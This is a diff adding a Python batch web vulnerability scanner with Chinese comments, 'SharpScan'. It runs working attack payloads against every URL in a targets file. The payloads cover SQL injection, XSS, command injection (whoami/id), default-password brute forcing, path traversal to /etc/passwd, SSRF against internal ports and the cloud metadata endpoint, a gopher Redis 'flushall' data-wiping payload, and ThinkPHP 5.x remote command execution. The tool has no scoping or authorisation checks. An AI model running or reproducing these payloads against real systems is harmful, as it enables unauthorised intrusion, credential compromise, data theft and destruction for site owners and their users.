@@ -1,0 +1,240 @@
+import requests
+import sys
+from concurrent.futures import ThreadPoolExecutor
+
+# 禁用请求警告
+requests.packages.urllib3.disable_warnings()
+
+
+class SharpScan:
+    def __init__(self):
+        self.vuln_results = []
+        self.session = requests.Session()
+        self.session.headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        }
+
+    # 1. SQL布尔盲注（已完成）
+    def poc_sql_bool_blind(self, url):
+        payloads = [
+            "' AND 1=1 -- ",
+            "' AND 1=2 -- ",
+            "\" AND 1=1 -- ",
+            "\" AND 1=2 -- "
+        ]
+        try:
+            origin_resp = self.session.get(url, timeout=5, verify=False)
+            origin_len = len(origin_resp.text)
+            for payload in payloads:
+                test_url = url + payload if "?" in url else url + "?" + payload
+                resp = self.session.get(test_url, timeout=5, verify=False)
+                if len(resp.text) != origin_len:
+                    return f"[SQL布尔盲注] {test_url[:60]}... → 布尔盲注存在"
+        except:
+            pass
+        return None
+
+    # 2. SQL时间盲注（已完成）
+    def poc_sql_time_blind(self, url):
+        payloads = [
+            "' AND SLEEP(3) -- ",
+            "\" AND SLEEP(3) -- ",
+            "; WAITFOR DELAY '00:00:03' -- "
+        ]
+        try:
+            for payload in payloads:
+                test_url = url + payload if "?" in url else url + "?" + payload
+                import time
+                start = time.time()
+                self.session.get(test_url, timeout=10, verify=False)
+                end = time.time()
+                if end - start >= 3:
+                    return f"[SQL时间盲注] {test_url[:60]}... → 时间盲注存在"
+        except:
+            pass
+        return None
+
+    # 3. 反射型XSS（已完成）
+    def poc_xss_reflected(self, url):
+        payloads = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "%3Cscript%3Ealert(1)%3C/script%3E"
+        ]
+        try:
+            for payload in payloads:
+                test_url = url + payload if "?" in url else url + "?" + payload
+                resp = self.session.get(test_url, timeout=5, verify=False)
+                if payload in resp.text or payload.replace("<", "&lt;").replace(">", "&gt;") in resp.text:
+                    return f"[反射型XSS] {test_url[:60]}... → XSS漏洞存在"
+        except:
+            pass
+        return None
+
+    # 4. 命令注入（已完成）
+    def poc_cmd_injection(self, url):
+        payloads = [
+            "; whoami",
+            "| whoami",
+            "& whoami",
+            "&& whoami",
+            "| id",
+            "; id"
+        ]
+        try:
+            for payload in payloads:
+                test_url = url + payload if "?" in url else url + "?" + payload
+                resp = self.session.get(test_url, timeout=5, verify=False)
+                if "root" in resp.text or "www-data" in resp.text or "administrator" in resp.text:
+                    return f"[命令注入] {test_url[:60]}... → {resp.text.strip()[:20]}"
+        except:
+            pass
+        return None
+
+    # 5. 弱口令爆破（已完成）
+    def poc_weak_password(self, url):
+        test_accounts = [
+            ("admin", "admin"),
+            ("admin", "123456"),
+            ("root", "root"),
+            ("test", "test")
+        ]
+        try:
+            if "login" in url.lower() or "signin" in url.lower():
+                for user, pwd in test_accounts:
+                    resp = self.session.post(url, data={"username": user, "password": pwd}, timeout=5, verify=False)
+                    if "success" in resp.text.lower() or "welcome" in resp.text.lower() or "dashboard" in resp.text.lower():
+                        return f"[弱口令] {url[:60]}... → 账号：{user} 密码：{pwd}"
+        except:
+            pass
+        return None
+
+    # 6. 任意文件读取（新增）
+    def poc_lfi(self, url):
+        payloads = [
+            "../../../../../../etc/passwd",
+            "../../../../../../windows/win.ini",
+            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+            "php://filter/convert.base64-encode/resource=index.php"
+        ]
+        for payload in payloads:
+            try:
+                test_url = url.replace("file=", "").replace("page=", "").split("?")[0]
+                if "?" in url:
+                    test_url = url.split("?")[0] + f"?file={payload}"
+                else:
+                    test_url = url + payload if not url.endswith("/") else url[:-1] + payload
+
+                resp = requests.get(test_url, timeout=6, verify=False, allow_redirects=False)
+                text = resp.text.lower()
+                if "root:" in text and "bash" in text or "extensions" in text and "mci" in text or "pd89" in text:
+                    return f"[任意文件读取] {test_url[:60]}... → 读取到系统文件"
+            except:
+                continue
+        return None
+
+    # 7. SSRF（基础版）（新增）
+    def poc_ssrf(self, url):
+        payloads = [
+            "http://127.0.0.1:22",
+            "http://127.0.0.1:3306",
+            "http://127.0.0.1:6379",
+            "http://169.254.169.254/latest/meta-data/",
+            "file:///etc/passwd",
+            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
+        ]
+        for payload in payloads:
+            try:
+                test_url = url.replace("url=", "").replace("u=", "").split("?")[0]
+                test_url = test_url + f"?url={payload}" if "?" in url else test_url + payload
+
+                resp = requests.get(test_url, timeout=7, verify=False)
+                text = resp.text.lower()
+                if any(kw in text for kw in ["ssh", "mysql", "redis", "ami-id", "root:", "uid="]):
+                    return f"[SSRF] {test_url[:60]}... → 访问到内网服务"
+            except:
+                continue
+        return None
+
+    # 8. ThinkPHP 5.x RCE（新增）
+    def poc_thinkphp_rce(self, url):
+        payloads = [
+            "?s=captcha&_method=__construct&method=GET&filter[]=system&server[REQUEST_METHOD]=whoami",
+            "?s=captcha&_method=__construct&method=GET&filter[]=system&get[]=id",
+            "?s=home/index/construct&name=1&_method=__construct&method=POST&filter[]=system&server[REQUEST_METHOD]=whoami"
+        ]
+        for payload in payloads:
+            try:
+                test_url = url.rstrip("/") + "/" + payload.lstrip("?")
+                resp = requests.get(test_url, timeout=6, verify=False)
+                if resp.status_code == 200 and len(resp.text) < 100 and (
+                        "root" in resp.text or "administrator" in resp.text or "www-data" in resp.text):
+                    cmd_result = resp.text.strip().replace("\n", "")
+                    return f"[ThinkPHP RCE] {test_url[:60]}... → {cmd_result}"
+            except:
+                continue
+        return None
+
+    # 扫描工作线程
+    def scan_worker(self, target):
+        print(f"正在扫描：{target}")
+        # 调用已完成的5个POC
+        sql_bool_res = self.poc_sql_bool_blind(target)
+        sql_time_res = self.poc_sql_time_blind(target)
+        xss_res = self.poc_xss_reflected(target)
+        cmd_res = self.poc_cmd_injection(target)
+        weak_pwd_res = self.poc_weak_password(target)
+
+        # 调用新增的3个POC
+        lfi_res = self.poc_lfi(target)
+        ssrf_res = self.poc_ssrf(target)
+        tp_res = self.poc_thinkphp_rce(target)
+
+        # 收集所有结果
+        all_results = [sql_bool_res, sql_time_res, xss_res, cmd_res, weak_pwd_res, lfi_res, ssrf_res, tp_res]
+        for res in all_results:
+            if res:
+                self.vuln_results.append(res)
+                print(f"✅ 发现漏洞：{res}")
+
+    # 批量扫描
+    def batch_scan(self, targets_file, threads=5):
+        try:
+            with open(targets_file, "r", encoding="utf-8") as f:
+                targets = [line.strip() for line in f if line.strip()]
+
+            with ThreadPoolExecutor(max_workers=threads) as executor:
+                executor.map(self.scan_worker, targets)
+
+            # 输出最终结果
+            print("\n" + "=" * 80)
+            print("扫描完成！漏洞汇总：")
+            print("=" * 80)
+            for idx, vuln in enumerate(self.vuln_results, 1):
+                print(f"{idx}. {vuln}")
+        except FileNotFoundError:
+            print(f"错误：找不到文件 {targets_file}")
+        except Exception as e:
+            print(f"扫描出错：{str(e)}")
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("使用方法：python AAArequest4.py targets.txt")
+        sys.exit(1)
+
+    scanner = SharpScan()
+    scanner.batch_scan(sys.argv[1])
+
+
+
+
+
+
+
+
+
+
+
+
+
